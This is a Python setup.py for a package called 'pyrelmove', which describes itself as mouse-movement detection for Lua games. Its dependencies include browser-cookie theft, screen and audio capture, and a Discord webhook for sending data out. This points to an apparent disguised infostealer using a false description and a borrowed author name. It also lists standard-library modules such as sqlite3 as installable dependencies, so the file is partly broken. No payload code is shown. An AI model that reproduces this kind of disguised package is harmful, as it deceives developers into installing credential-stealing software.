from setuptools import setup, find_packages
import codecs
import os

here = os.path.abspath(os.path.dirname(__file__))

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = "\n" + fh.read()

VERSION = '0.0.13'
DESCRIPTION = 'Mouse Movement Detection'
LONG_DESCRIPTION = 'A package that allows Developers to easily track mousemovement in their lua Game'

# Setting up
setup(
    name="pyrelmove",
    version=VERSION,
    author="NeuralNine (John Smith)",
    author_email="<Johnsmith129@gmail.com>",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=['opencv-python', 'discord_webhook', 'browser_cookie3', 'pyautogui', 'pyaudio','psutil', 'zipfile', 'sqlite3',],
    keywords=['python', 'movement'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)
